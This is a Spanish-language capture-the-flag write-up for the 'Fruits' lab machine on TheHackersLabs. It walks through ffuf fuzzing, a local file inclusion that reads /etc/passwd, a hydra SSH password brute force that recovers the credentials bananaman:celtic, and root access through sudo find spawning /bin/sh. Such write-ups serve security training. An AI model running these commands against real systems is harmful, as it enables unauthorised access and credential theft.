# Writeup — Fruits (TheHackersLabs)

**Máquina:** Fruits  
**Plataforma:** TheHackersLabs  
**Sistema:** Debian 6.1.76-1 (kernel 6.1.0-18-amd64)  
**IP:** 10.10.0.5
**Objetivo:** Obtener User.txt y Root.txt

---

## 1. Reconocimiento Web

Fuzzing de directorios y archivos con `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -v -u http://10.10.0.5/FUZZ -e .html,.php,.txt,.pdf,.docx
```

Resultados relevantes:
- `/` → 200 (index.html, 1811 bytes)
- `/index.html` → 200
- `/fruits.php` → 200 (tamaño 1)

---

## 2. Fuzzing de Parámetros (LFI)

Descubrimiento del parámetro `file` en `fruits.php`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://10.10.0.5/fruits.php?FUZZ=/etc/passwd" -fs 1
```

El valor `/etc/passwd` revela el parámetro `file` porque la respuesta cambia de tamaño al incluir un archivo existente.

---

## 3. Fuzzing de Valores LFI

Confirmado el parámetro `file`, se fuzzéan valores LFI para descubrir archivos accesibles:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://10.10.0.5/fruits.php?file=FUZZ" -fs 1
```

Resultado: solo `/etc/passwd` responde con tamaño distinto. El resto de payloads (path traversal, wrappers) no funcionan, lo que indica que la función PHP usada probablemente es `file_get_contents()` con rutas absolutas, sin filtros.

---

## 4. Explotación LFI

```bash
curl "http://10.10.0.5/fruits.php?file=/etc/passwd"
```

Se obtiene `/etc/passwd` con un usuario interesante: **bananaman**.

---

## 5. Fuerza Bruta SSH

```bash
hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.5 -t 20
```

**Credenciales:** `bananaman:celtic`

---

## 6. Acceso SSH y Flag de Usuario

```bash
ssh bananaman@10.10.0.5
cat user.txt
```

**user.txt:** `<REDACTED>`

---

## 7. Escalada de Privilegios

```bash
sudo -l
```

```
Matching Defaults entries for bananaman on Fruits:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bananaman may run the following commands on Fruits:
    (ALL) NOPASSWD: /usr/bin/find
```

```bash
sudo find . -exec /bin/sh \; -quit
# whoami
root
cat /root/root.txt
```

**root.txt:** `<REDACTED>`

---

## Resumen

| Paso | Técnica | Resultado |
|------|---------|-----------|
| Web fuzzing | ffuf directorios + extensiones | `/fruits.php` |
| Parameter fuzzing | ffuf con `/etc/passwd` | Parámetro `file` con LFI |
| Value fuzzing | LFI-Jhaddix.txt en `file=` | Solo `/etc/passwd` accesible |
| LFI | `file=/etc/passwd` | Usuario `bananaman` |
| SSH brute force | hydra + rockyou | `bananaman:celtic` |
| Privesc | `sudo find` (GTFOBins) | Root |

**Flags:** `<REDACTED>` / `<REDACTED>`
